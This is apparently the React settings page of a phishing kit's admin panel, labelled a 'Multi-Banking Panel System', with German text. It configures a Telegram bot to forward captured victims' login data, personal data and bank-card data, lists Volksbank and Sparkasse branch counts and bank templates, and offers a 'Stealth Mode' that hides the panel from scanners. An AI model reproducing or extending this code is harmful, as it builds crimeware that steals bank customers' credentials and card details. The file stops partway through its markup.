import React, { useState, useEffect } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { 
  Shield, 
  MessageSquare, 
  Globe, 
  Database, 
  Server, 
  Eye, 
  Zap, 
  AlertTriangle,
  Key,
  Lock,
  Activity,
  Clock,
  Users,
  Mail,
  Settings as SettingsIcon,
  CheckCircle,
  XCircle,
  Send,
  Loader,
  Bell,
  CreditCard
} from 'lucide-react';
import { telegramAPI, authAPI } from '../utils/api';

export const Settings: React.FC = () => {
  const queryClient = useQueryClient();
  
  // System settings (existing)
  const [autoCleanup, setAutoCleanup] = useState(true);
  const [stealthMode, setStealthMode] = useState(false);
  const [rateLimiting, setRateLimiting] = useState(true);
  const [debugMode, setDebugMode] = useState(false);
  const [emailNotifications, setEmailNotifications] = useState(true);
  
  // Password change state
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [passwordSuccess, setPasswordSuccess] = useState<string | null>(null);
  const [isChangingPassword, setIsChangingPassword] = useState(false);
  
  // Telegram settings
  const [telegramSettings, setTelegramSettings] = useState({
    bot_token: '',
    chat_id: '',
    admin_chat_id: '',
    notifications_enabled: true,
    notify_on_login: true,
    notify_on_personal_data: true,
    notify_on_bank_card: true,
    notify_on_completion: true,
    message_template: ''
  });
  
  const [testChatId, setTestChatId] = useState('');
  
  // Fetch Telegram settings
  const { data: telegramData, isLoading: telegramLoading } = useQuery({
    queryKey: ['telegram-settings'],
    queryFn: telegramAPI.getSettings
  });
  
  // Fetch bot status
  const { data: botStatus, isLoading: statusLoading } = useQuery({
    queryKey: ['telegram-bot-status'],
    queryFn: telegramAPI.getBotStatus,
    refetchInterval: 30000 // Check every 30 seconds
  });
  
  // Update settings mutation
  const updateSettingsMutation = useMutation({
    mutationFn: telegramAPI.updateSettings,
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['telegram-settings'] });
      queryClient.invalidateQueries({ queryKey: ['telegram-bot-status'] });
    }
  });
  
  // Test notification mutation
  const testNotificationMutation = useMutation({
    mutationFn: (chatId: string) => telegramAPI.sendTestNotification(chatId)
  });
  
  // Bot info mutation
  const botInfoMutation = useMutation({
    mutationFn: (botToken: string) => telegramAPI.getBotInfo(botToken)
  });
  
  // Discover chats mutation
  const discoverChatsMutation = useMutation({
    mutationFn: (botToken: string) => telegramAPI.discoverChats(botToken)
  });
  
  // Update local state when data loads
  useEffect(() => {
    if (telegramData) {
      setTelegramSettings(telegramData);
      setTestChatId(telegramData.chat_id || '');
    }
  }, [telegramData]);
  
  // Handle settings update
  const handleTelegramSettingsUpdate = async () => {
    try {
      await updateSettingsMutation.mutateAsync(telegramSettings);
    } catch (error) {
      console.error('Failed to update Telegram settings:', error);
    }
  };
  
  // Handle test notification
  const handleTestNotification = async () => {
    if (!testChatId) {
      alert('Bitte geben Sie eine Chat ID ein');
      return;
    }
    
    try {
      await testNotificationMutation.mutateAsync(testChatId);
      alert('Test-Benachrichtigung erfolgreich gesendet!');
    } catch (error) {
      alert(`Fehler beim Senden der Test-Benachrichtigung: ${error.message}`);
    }
  };
  
  // Handle bot info retrieval
  const handleGetBotInfo = async () => {
    if (!telegramSettings.bot_token) {
      alert('Bitte geben Sie zuerst einen Bot Token ein');
      return;
    }
    
    try {
      const result = await botInfoMutation.mutateAsync(telegramSettings.bot_token);
      alert(`Bot Info:\nUsername: @${result.botInfo.username}\nName: ${result.botInfo.first_name}\nKann Gruppen beitreten: ${result.botInfo.can_join_groups ? 'Ja' : 'Nein'}`);
    } catch (error) {
      alert(`Fehler beim Abrufen der Bot-Informationen: ${error.message}`);
    }
  };
  
  // Handle chat ID discovery
  const handleDiscoverChats = async () => {
    if (!telegramSettings.bot_token) {
      alert('Bitte geben Sie zuerst einen Bot Token ein');
      return;
    }
    
    try {
      const result = await discoverChatsMutation.mutateAsync(telegramSettings.bot_token);
      
      let message = 'Chat-Erkennung abgeschlossen!\n\n';
      
      if (result.adminChats && result.adminChats.length > 0) {
        message += 'Gefundene Admin-Chats:\n';
        result.adminChats.forEach((chat: any) => {
          message += `• ${chat.name} (${chat.username ? '@' + chat.username : 'Kein Username'}): ${chat.id}\n`;
        });
        message += '\n';
        
        // Auto-fill first admin chat ID
        if (result.adminChats.length > 0) {
          setTelegramSettings(prev => ({ ...prev, admin_chat_id: result.adminChats[0].id }));
        }
      }
      
      if (result.groupChats && result.groupChats.length > 0) {
        message += 'Gefundene Gruppen:\n';
        result.groupChats.forEach((chat: any) => {
          message += `• ${chat.title}: ${chat.id}\n`;
        });
        message += '\n';
        
        // Auto-fill first group chat ID
        if (result.groupChats.length > 0) {
          setTelegramSettings(prev => ({ ...prev, chat_id: result.groupChats[0].id }));
        }
      }
      
      if (result.adminChats.length === 0 && result.groupChats.length === 0) {
        message += 'Keine Chats gefunden.\n\n';
        message += 'Anweisungen:\n';
        message += '1. Senden Sie /start an den Bot in einer privaten Nachricht\n';
        message += '2. Fügen Sie den Bot zu einer Gruppe hinzu und senden Sie eine Nachricht\n';
        message += '3. Klicken Sie erneut auf "Chat IDs erkennen"';
      }
      
      alert(message);
    } catch (error) {
      alert(`Fehler bei der Chat-Erkennung: ${error.message}`);
    }
  };

  // Handle password change
  const handlePasswordChange = async () => {
    // Reset messages
    setPasswordError(null);
    setPasswordSuccess(null);
    
    // Validate inputs
    if (!currentPassword) {
      setPasswordError('Bitte geben Sie Ihr aktuelles Passwort ein');
      return;
    }
    
    if (!newPassword) {
      setPasswordError('Bitte geben Sie ein neues Passwort ein');
      return;
    }
    
    if (newPassword.length < 8) {
      setPasswordError('Das neue Passwort muss mindestens 8 Zeichen lang sein');
      return;
    }
    
    if (newPassword !== confirmPassword) {
      setPasswordError('Die Passwörter stimmen nicht überein');
      return;
    }
    
    setIsChangingPassword(true);
    
    try {
      await authAPI.changePassword(currentPassword, newPassword);
      setPasswordSuccess('Passwort erfolgreich geändert!');
      // Clear the form
      setCurrentPassword('');
      setNewPassword('');
      setConfirmPassword('');
    } catch (error: any) {
      setPasswordError(error.message || 'Fehler beim Ändern des Passworts');
    } finally {
      setIsChangingPassword(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Einstellungen</h1>
          <p className="text-gray-600 mt-1">Konfigurieren Sie Ihr Multi-Banking Panel System</p>
        </div>
        <div className="flex items-center space-x-2 text-sm text-gray-500">
          <Activity className="h-4 w-4" />
          <span>System läuft seit 2h 34m</span>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Security Settings */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Shield className="h-6 w-6 text-red-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">Sicherheit</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            {/* Password Change Section */}
            <div className="space-y-4">
              <label className="block text-sm font-medium text-gray-700">Admin Passwort ändern</label>
              
            <div>
                <label className="block text-xs text-gray-500 mb-1">Aktuelles Passwort</label>
                <input
                  type="password"
                  value={currentPassword}
                  onChange={(e) => setCurrentPassword(e.target.value)}
                  placeholder="Aktuelles Passwort eingeben"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                />
              </div>
              
              <div>
                <label className="block text-xs text-gray-500 mb-1">Neues Passwort</label>
                <input
                  type="password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  placeholder="Neues Passwort (min. 8 Zeichen)"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                />
            </div>
            
            <div>
                <label className="block text-xs text-gray-500 mb-1">Passwort bestätigen</label>
                <input
                  type="password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  placeholder="Neues Passwort bestätigen"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
                />
              </div>
              
              {/* Error Message */}
              {passwordError && (
                <div className="p-3 bg-red-50 border border-red-200 rounded-md">
                  <p className="text-sm text-red-600 flex items-center">
                    <XCircle className="h-4 w-4 mr-2" />
                    {passwordError}
                  </p>
                </div>
              )}
              
              {/* Success Message */}
              {passwordSuccess && (
                <div className="p-3 bg-green-50 border border-green-200 rounded-md">
                  <p className="text-sm text-green-600 flex items-center">
                    <CheckCircle className="h-4 w-4 mr-2" />
                    {passwordSuccess}
                  </p>
                </div>
              )}
              
              <button 
                onClick={handlePasswordChange}
                disabled={isChangingPassword}
                className="w-full px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 text-sm disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2"
              >
                {isChangingPassword ? (
                  <>
                    <Loader className="h-4 w-4 animate-spin" />
                    <span>Wird geändert...</span>
                  </>
                ) : (
                  <>
                    <Lock className="h-4 w-4" />
                    <span>Passwort ändern</span>
                  </>
                )}
              </button>
            </div>
            
            <div className="border-t border-gray-200 pt-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">JWT Secret</label>
              <div className="flex space-x-3">
                <input
                  type="password"
                  value="••••••••••••••••••••••••••••••••"
                  readOnly
                  className="flex-1 px-3 py-2 border border-gray-300 rounded-md shadow-sm bg-gray-50 text-sm font-mono"
                />
                <button className="px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 text-sm" title="JWT Secret kann nur über Umgebungsvariablen geändert werden">
                  <Key className="h-4 w-4" />
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-1">JWT Secret wird über Umgebungsvariablen konfiguriert</p>
            </div>

            <div className="flex items-center justify-between border-t border-gray-200 pt-6">
              <div>
                <label className="text-sm font-medium text-gray-700">Stealth Mode</label>
                <p className="text-xs text-gray-500">Versteckt Admin-Panel vor Scannern</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={stealthMode}
                  onChange={(e) => setStealthMode(e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-red-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-600"></div>
              </label>
            </div>
          </div>
        </div>

        {/* Telegram Notifications */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <MessageSquare className="h-6 w-6 text-blue-600" />
                <h2 className="ml-3 text-lg font-medium text-gray-900">Telegram Benachrichtigungen</h2>
              </div>
              {/* Bot Status Indicator */}
              <div className="flex items-center space-x-2">
                {statusLoading ? (
                  <Loader className="h-4 w-4 animate-spin text-gray-400" />
                ) : botStatus?.connected ? (
                  <div className="flex items-center space-x-1">
                    <CheckCircle className="h-4 w-4 text-green-500" />
                    <span className="text-xs text-green-600">@{botStatus.username}</span>
                  </div>
                ) : (
                  <div className="flex items-center space-x-1">
                    <XCircle className="h-4 w-4 text-red-500" />
                    <span className="text-xs text-red-600">Nicht verbunden</span>
                  </div>
                )}
              </div>
            </div>
          </div>
          <div className="p-6 space-y-6">
            {telegramLoading ? (
              <div className="flex items-center justify-center py-8">
                <Loader className="h-6 w-6 animate-spin text-gray-400" />
                <span className="ml-2 text-gray-500">Lade Telegram-Einstellungen...</span>
              </div>
            ) : (
              <>
                {/* Enable/Disable Toggle */}
                <div className="flex items-center justify-between">
                  <div>
                    <label className="text-sm font-medium text-gray-700">Telegram aktiviert</label>
                    <p className="text-xs text-gray-500">Benachrichtigungen über neue Leads</p>
                  </div>
                  <label className="relative inline-flex items-center cursor-pointer">
                    <input
                      type="checkbox"
                      checked={telegramSettings.notifications_enabled}
                      onChange={(e) => setTelegramSettings(prev => ({ ...prev, notifications_enabled: e.target.checked }))}
                      className="sr-only peer"
                    />
                    <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                  </label>
                </div>

                {/* Bot Token */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Bot Token</label>
                  <div className="space-y-2">
                    <input
                      type="password"
                      value={telegramSettings.bot_token}
                      onChange={(e) => setTelegramSettings(prev => ({ ...prev, bot_token: e.target.value }))}
                      placeholder="123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
                      className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors"
                    />
                    <div className="flex space-x-2">
                      <button
                        onClick={handleGetBotInfo}
                        disabled={botInfoMutation.isPending || !telegramSettings.bot_token}
                        className="px-3 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center space-x-2 transition-colors text-sm"
                      >
                        {botInfoMutation.isPending ? (
                          <Loader className="h-4 w-4 animate-spin" />
                        ) : (
                          <SettingsIcon className="h-4 w-4" />
                        )}
                        <span>Bot Info</span>
                      </button>
                      <button
                        onClick={handleDiscoverChats}
                        disabled={discoverChatsMutation.isPending || !telegramSettings.bot_token}
                        className="px-3 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center space-x-2 transition-colors text-sm"
                      >
                        {discoverChatsMutation.isPending ? (
                          <Loader className="h-4 w-4 animate-spin" />
                        ) : (
                          <Users className="h-4 w-4" />
                        )}
                        <span>Chat IDs erkennen</span>
                      </button>
                    </div>
                  </div>
                  <p className="text-xs text-gray-500 mt-1">
                    Bot Token von @BotFather erhalten. Verwenden Sie "Chat IDs erkennen" für automatische Konfiguration.
                  </p>
                </div>

                {/* Chat ID */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Gruppen Chat ID</label>
                  <input
                    type="text"
                    value={telegramSettings.chat_id}
                    onChange={(e) => setTelegramSettings(prev => ({ ...prev, chat_id: e.target.value }))}
                    placeholder="-1001234567890"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Negative Zahl für Gruppen (z.B. -1001234567890)
                  </p>
                </div>

                {/* Admin Chat ID */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Admin Chat ID (Optional)</label>
                  <input
                    type="text"
                    value={telegramSettings.admin_chat_id}
                    onChange={(e) => setTelegramSettings(prev => ({ ...prev, admin_chat_id: e.target.value }))}
                    placeholder="123456789"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Separate Chat ID für Admin-Benachrichtigungen
                  </p>
                </div>

                {/* Notification Type Toggles */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-3">Benachrichtigungs-Typen</label>
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Login-Daten</span>
                      <label className="relative inline-flex items-center cursor-pointer">
                        <input
                          type="checkbox"
                          checked={telegramSettings.notify_on_login}
                          onChange={(e) => setTelegramSettings(prev => ({ ...prev, notify_on_login: e.target.checked }))}
                          className="sr-only peer"
                        />
                        <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                      </label>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Persönliche Daten</span>
                      <label className="relative inline-flex items-center cursor-pointer">
                        <input
                          type="checkbox"
                          checked={telegramSettings.notify_on_personal_data}
                          onChange={(e) => setTelegramSettings(prev => ({ ...prev, notify_on_personal_data: e.target.checked }))}
                          className="sr-only peer"
                        />
                        <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                      </label>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Bankkarten-Daten</span>
                      <label className="relative inline-flex items-center cursor-pointer">
                        <input
                          type="checkbox"
                          checked={telegramSettings.notify_on_bank_card}
                          onChange={(e) => setTelegramSettings(prev => ({ ...prev, notify_on_bank_card: e.target.checked }))}
                          className="sr-only peer"
                        />
                        <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                      </label>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Abschluss-Benachrichtigung</span>
                      <label className="relative inline-flex items-center cursor-pointer">
                        <input
                          type="checkbox"
                          checked={telegramSettings.notify_on_completion}
                          onChange={(e) => setTelegramSettings(prev => ({ ...prev, notify_on_completion: e.target.checked }))}
                          className="sr-only peer"
                        />
                        <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-blue-600"></div>
                      </label>
                    </div>
                  </div>
                </div>

                {/* Test Notification */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Test-Benachrichtigung</label>
                  <div className="flex space-x-2">
                    <input
                      type="text"
                      value={testChatId}
                      onChange={(e) => setTestChatId(e.target.value)}
                      placeholder="Chat ID für Test"
                      className="flex-1 px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors"
                    />
                    <button
                      onClick={handleTestNotification}
                      disabled={testNotificationMutation.isPending || !testChatId}
                      className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center space-x-2 transition-colors"
                    >
                      {testNotificationMutation.isPending ? (
                        <Loader className="h-4 w-4 animate-spin" />
                      ) : (
                        <Send className="h-4 w-4" />
                      )}
                      <span>Test</span>
                    </button>
                  </div>
                </div>

                {/* Save Button */}
                <div className="pt-4 border-t border-gray-200">
                  <button
                    onClick={handleTelegramSettingsUpdate}
                    disabled={updateSettingsMutation.isPending}
                    className="w-full px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2 transition-colors"
                  >
                    {updateSettingsMutation.isPending ? (
                      <Loader className="h-4 w-4 animate-spin" />
                    ) : (
                      <SettingsIcon className="h-4 w-4" />
                    )}
                    <span>Einstellungen speichern</span>
                  </button>
                </div>

                {/* Error/Success Messages */}
                {updateSettingsMutation.isError && (
                  <div className="p-3 bg-red-50 border border-red-200 rounded-md">
                    <p className="text-sm text-red-600">
                      Fehler beim Speichern: {updateSettingsMutation.error?.message}
                    </p>
                  </div>
                )}
                
                {updateSettingsMutation.isSuccess && (
                  <div className="p-3 bg-green-50 border border-green-200 rounded-md">
                    <p className="text-sm text-green-600">
                      Einstellungen erfolgreich gespeichert!
                    </p>
                  </div>
                )}

                {testNotificationMutation.isError && (
                  <div className="p-3 bg-red-50 border border-red-200 rounded-md">
                    <p className="text-sm text-red-600">
                      Test-Benachrichtigung fehlgeschlagen: {testNotificationMutation.error?.message}
                    </p>
                  </div>
                )}
                
                {testNotificationMutation.isSuccess && (
                  <div className="p-3 bg-green-50 border border-green-200 rounded-md">
                    <p className="text-sm text-green-600">
                      Test-Benachrichtigung erfolgreich gesendet!
                    </p>
                  </div>
                )}
              </>
            )}
          </div>
        </div>

        {/* System Configuration */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Server className="h-6 w-6 text-green-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">System Konfiguration</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <label className="text-sm font-medium text-gray-700">Rate Limiting</label>
                <p className="text-xs text-gray-500">Schutz vor Brute-Force Angriffen</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={rateLimiting}
                  onChange={(e) => setRateLimiting(e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-green-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
              </label>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Max Requests/15min</label>
                <input
                  type="number"
                  defaultValue="100"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 text-sm bg-white hover:border-gray-400 transition-colors"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Session Timeout (h)</label>
                <input
                  type="number"
                  defaultValue="24"
                  className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 text-sm bg-white hover:border-gray-400 transition-colors"
                />
              </div>
            </div>

            <div className="flex items-center justify-between">
              <div>
                <label className="text-sm font-medium text-gray-700">Auto-Cleanup</label>
                <p className="text-xs text-gray-500">Automatisches Löschen alter Sessions/Logs</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={autoCleanup}
                  onChange={(e) => setAutoCleanup(e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-green-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-600"></div>
              </label>
            </div>
          </div>
        </div>

        {/* Database Management */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Database className="h-6 w-6 text-purple-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">Datenbank Verwaltung</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            <div className="grid grid-cols-3 gap-4 text-center">
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="text-2xl font-bold text-gray-900">7,571</div>
                <div className="text-sm text-gray-500">Volksbank Filialen</div>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="text-2xl font-bold text-gray-900">7,930</div>
                <div className="text-sm text-gray-500">Sparkasse Filialen</div>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="text-2xl font-bold text-gray-900">11</div>
                <div className="text-sm text-gray-500">Bank Templates</div>
              </div>
            </div>

            <div className="space-y-3">
              <button className="w-full px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 text-sm">
                Datenbank optimieren
              </button>
              <button className="w-full px-4 py-2 bg-gray-600 text-white rounded-md hover:bg-gray-700 text-sm">
                Backup erstellen
              </button>
              <button className="w-full px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 text-sm">
                Alte Sessions löschen
              </button>
            </div>
          </div>
        </div>

        {/* Advanced Hacker Settings */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Zap className="h-6 w-6 text-yellow-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">Erweiterte Einstellungen</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <label className="text-sm font-medium text-gray-700">Debug-Modus</label>
                <p className="text-xs text-gray-500">Detaillierte Logs und API-Debugging</p>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={debugMode}
                  onChange={(e) => setDebugMode(e.target.checked)}
                  className="sr-only peer"
                />
                <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-yellow-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-yellow-600"></div>
              </label>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">CORS Origins</label>
              <textarea
                rows={3}
                defaultValue="https://bankingsuite.codingcartel.li"
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-yellow-500 focus:border-yellow-500 text-sm bg-white hover:border-gray-400 transition-colors font-mono"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Vertrauenswürdige Proxies</label>
              <input
                type="text"
                placeholder="10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-yellow-500 focus:border-yellow-500 text-sm bg-white hover:border-gray-400 transition-colors font-mono"
              />
            </div>
          </div>
        </div>

        {/* Language & Localization */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Globe className="h-6 w-6 text-blue-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">Sprache & Lokalisierung</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Interface Sprache</label>
              <select className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors">
                <option>Deutsch</option>
                <option>English</option>
                <option>Français</option>
                <option>Español</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Zeitzone</label>
              <select className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors">
                <option>Europe/Berlin (UTC+1)</option>
                <option>UTC (UTC+0)</option>
                <option>America/New_York (UTC-5)</option>
                <option>Asia/Tokyo (UTC+9)</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Datumsformat</label>
              <select className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 text-sm bg-white hover:border-gray-400 transition-colors">
                <option>DD.MM.YYYY (Deutsch)</option>
                <option>MM/DD/YYYY (US)</option>
                <option>YYYY-MM-DD (ISO)</option>
              </select>
            </div>
          </div>
        </div>

        {/* Performance & Monitoring */}
        <div className="bg-white shadow rounded-lg">
          <div className="p-6 border-b border-gray-200">
            <div className="flex items-center">
              <Eye className="h-6 w-6 text-indigo-600" />
              <h2 className="ml-3 text-lg font-medium text-gray-900">Performance & Monitoring</h2>
            </div>
          </div>
          <div className="p-6 space-y-6">
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                <div className="flex items-center">
                  <Activity className="h-5 w-5 text-green-600" />
                  <span className="ml-2 text-sm font-medium text-green-800">System Status</span>
                </div>
                <div className="mt-2 text-lg font-bold text-green-900">Online</div>
              </div>
              <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
                <div className="flex items-center">
                  <Clock className="h-5 w-5 text-blue-600" />
                  <span className="ml-2 text-sm font-medium text-blue-800">Uptime</span>
                </div>
                <div className="mt-2 text-lg font-bold text-blue-900">2h 34m</div>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Log Level</label>
              <select className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 text-sm bg-white hover:border-gray-400 transition-colors">
                <option>info</option>
                <option>debug</option>
                <option>warn</option>
                <option>error</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Max File Size (MB)</label>
              <input
                type="number"
                defaultValue="10"
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 text-sm bg-white hover:border-gray-400 transition-colors"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Dashboard Notifications */}
